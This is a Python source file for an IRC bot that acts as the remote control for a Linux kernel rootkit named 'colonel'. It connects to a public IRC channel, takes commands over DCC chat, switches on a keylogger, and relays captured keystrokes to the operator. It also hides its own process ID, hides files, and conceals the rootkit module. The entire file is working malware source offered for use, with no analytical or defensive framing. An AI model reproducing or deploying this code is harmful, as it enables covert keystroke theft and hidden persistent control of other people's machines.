#!/usr/bin/env python
# HIDE NETSTAT INFO --- ENABLE DCC SEND. 
"""
This bot uses the SingleServerIRCBot class from irc.bot. The primary 
purpose of the bot is to send commands received through DCC sessions 
to the colonel rootkit. Commands in channel messages are given by 
prefixing the text by the bot nickname followed by a colon. 

Bot commands are:

    BOT COMMANDS --------
	dcc -- Command a bot DCC CHAT invite connection. 
               All root commands must be sent via dcc.
        stats -- Print some channel information.
    	disconnect -- Disconnect the bot from a DCC session. 
		      The bot will try to reconnect after 15 seconds.
    	die -- Kill the bot.

    ROOT COMMANDS -------
    	tls -- Toggle keylogger listening on/off. 
    	keylog -- Print keyboard input log. 
                  Keylogger is turned off.
    	hpXXXX -- Hide a process id.
    	sp -- Show the last hidden process.
    	thf -- Toggle files show/hide.
    	mh -- Hide the root module. 
    	ms -- Show the root module.
"""

import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
from os import getpid, geteuid, remove
from sys import exit

import key

server = "chat.freenode.net"
port = 6667
channel = "#rwx-hack"
nickname = "rwx-lkm"

dcc_nick = None
evlog = '/opt/col_log/evlog.txt'
proc_col = '/proc/colonel'

# Debug Mode 
debug = True 

class Bot(irc.bot.SingleServerIRCBot):
	def __init__(self, channel, nickname, server, port=6667):
        	irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname, reconnection_interval=15)
        	self.channel = channel
    		self.valid_cmds = ["sp", "tls", "thf", "mh", "ms"] 

	def on_nicknameinuse(self, c, e):
		if debug:
			print "Nickname in use. Modifying to " + c.get_nickname() + "_"
        	c.nick(c.get_nickname() + "_")

	def on_welcome(self, c, e):
        	if debug:
            		print "Joining %s" % self.channel
        	c.join(self.channel)

	def on_privmsg(self, c, e):
        	self.do_command(e, e.arguments[0], c)

	def on_pubmsg(self, c, e):
        	a = e.arguments[0].split(":", 1)
		if len(a) > 1 and irc.strings.lower(a[0]) == irc.strings.lower(self.connection.get_nickname()):
            		self.do_command(e, a[1].strip(), c)
        	return

    	def on_dccmsg(self, c, e):
		dcc = True
        	self.do_command(e, e.arguments[0], c, dcc)

	def on_dccchat(self, c, e):
		if len(e.arguments) != 2:
			return
		args = e.arguments[1].split()
		if len(args) == 4:
			try:
				address = ip_numstr_to_quad(args[2])
				port = int(args[3])
			except ValueError:
				return
			self.dcc_connect(address, port)

	def print_irc(self, c, chan, text, dc):
		if dc:
			c.privmsg(text)
		else:
			c.notice(chan, text)

	def root_command(self, cmd):
		f = open(proc_col, "w")
		f.write(cmd)
		f.close()

	def root_status(self):
		f = open(proc_col, "r")
		s = f.read().split("\n")
		for n in reversed(range(len(s)-1)):
			if "STATUS" in s[n]:
				del s[:n]
				return s
		return

	# Translate and print the keylog to console.
	def keylogs(self):
		log = open(evlog, 'r')
		f = log.read()
		log.close()
		kl = key.translate(f)
		# MUST ADD DCC SEND BEFORE DELETING!!!!!
		return kl

	def trunc_keylog(self):
		f = open(evlog, 'w')
		f.truncate()

	def error_log(self):
		# SEND ERROR LOG VIA DCC THEN DELETE
		# errlog = '/opt/col_log/log.txt'
		# f = open(errlog, 'rw+')
		# f.truncate()
		# f.close()
		pass

	def _cmd_disconnect(self, c, e, cmd, nick, dcc):
		if debug:
			print "Disconnecting. Will attempt reconnect in 15 seconds..."
		self.disconnect()

	def _cmd_die(self, c, e, cmd, nick, dcc):
		if debug:
			print "Dead bot."
		self.die()

	def _cmd_stats(self, c, e, cmd, nick, dcc):
		if dcc:
			c.privmsg("stats cmd not available on DCC chat.")
		else:
			for chname, chobj in self.channels.items():
				c.notice(chname, "--- Channel Statistics ---")
				c.notice(chname, "Channel: " + chname)
				users = chobj.users()
				users.sort() 
				c.notice(chname, "Users: " + ", ".join(users))
				opers = chobj.opers()
				opers.sort()
				c.notice(chname, "Opers: " + ", ".join(opers)) 
				voiced = chobj.voiced()
				voiced.sort()
				c.notice(chname, "Voiced: " + ", ".join(voiced))
			if debug:
				print "Retrieving channel stats."
				print "--- Channel Statistics ---"
				print "Channel: " + chname
				print "Users: " + ", ".join(users)
				print "Opers: " + ", ".join(opers)
				print "Voiced: " + ", ".join(voiced)
	 
	def _cmd_help(self, c, e, cmd, nick, dcc):
		help_doc =  """
BOT COMMANDS --------
dcc -- Command a bot dcc chat invite connection. All root commands must be sent via DCC.
stats -- Print some channel information.
disconnect -- Disconnect the bot from a DCC session. The bot will try to reconnect after 15 seconds.
die -- Kill the bot.
ROOT COMMANDS -------
tls -- Toggle keylogger listening on/off. 
keylog -- Print keyboard input log. Keylogger is turned off.
hpxxxx -- Hide a process id.
sp -- Show the last hidden process.
thf -- Toggle files show/hide.
mh -- Hide the root module. 
ms -- Show the root module.
"""
		txt = help_doc.split("\n")
		for line in txt:
			self.print_irc(c, channel, line, dcc)
			if debug:
				print line
	def _cmd_keylog(self, c, e, cmd, nick, dcc):
		self.root_command(cmd)
		txt = "Command %s executed." % cmd
		self.print_irc(c, channel, txt, dcc)
		for k in self.keylogs().split('\n'):
			if None == k:
				txt = "Log empty."
				self.print_irc(c, channel, line, dcc)
		    	else:
				self.print_irc(c, channel, k, dcc)
		    	if debug:
				print "Command %s executed." % cmd
				if None == k:
			    		print "Log empty."
				else:
			   		print k
		status = self.root_status()
		for line in status:
			self.print_irc(c, channel, line, dcc)
		    	if debug:
				print "%s" % line
		self.trunc_keylog()

	def _cmd_dcc(self, c, e, cmd, nick, dcc):
		global dcc_nick
		dcc_nick = nick
		if dcc:
			c.privmsg("DCC enabled.")
		else:
			c.notice(channel, "To begin DCC, type: /dcc CHAT %s" % nickname)
			dcc = self.dcc_listen()
			c.ctcp("DCC", nick, "CHAT chat %s %d" % (
			ip_quad_to_numstr(dcc.localaddress),
			dcc.localport))
			if debug:
				print "dcc", nick, "CHAT chat %s %d" % (
				ip_quad_to_numstr(dcc.localaddress), 					
				dcc.localport)
   
	def fallback(self, c, e, cmd, nick, dcc):
		if cmd in self.valid_cmds or "hp" in cmd:
	    		self.root_command(cmd)
            		status = self.root_status()
			txt = "Command %s executed." % cmd
			self.print_irc(c, channel, txt, dcc)
            		for line in status:
				self.print_irc(c, channel, line, dcc)
                		if debug:
        				print "%s" % line
		else:
			if debug:
				print "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname)
			txt = "Invalid command: %s. Use %s: help for a command listing." % (cmd, self._nickname)
			self.print_irc(c, channel, txt, dcc)

	def do_command(self, e, cmd, c=None, dcc=False):
		global dcc_nick
        	if dcc:
			nick = dcc_nick
			c = c
		else:
			nick = e.source.nick
	        	c = self.connection

		fn = getattr(self, "_cmd_%s"%cmd, self.fallback)
		if fn:
			fn(c, e, cmd, nick, dcc)


def hide_pid():
	pid = "hp" + str(getpid())
    	f = open(proc_col, 'a')
    	f.write(pid)
	f.close()
	if debug:
		print "PID: %s hidden" % pid

def is_root():
	if geteuid() != 0:
		if debug:
			print "Must be root."
		exit()
	else:
		if debug:
			print "Bot has root privileges."


def main():
    	col_bot = Bot(channel, nickname, server, port)
    	# Hide the bot's PID.
    	hide_pid()
	is_root()
    	if debug:
        	print "Connecting to %s on port: %d" % (server, port)
    	col_bot.start()


if __name__ == "__main__":
	main()
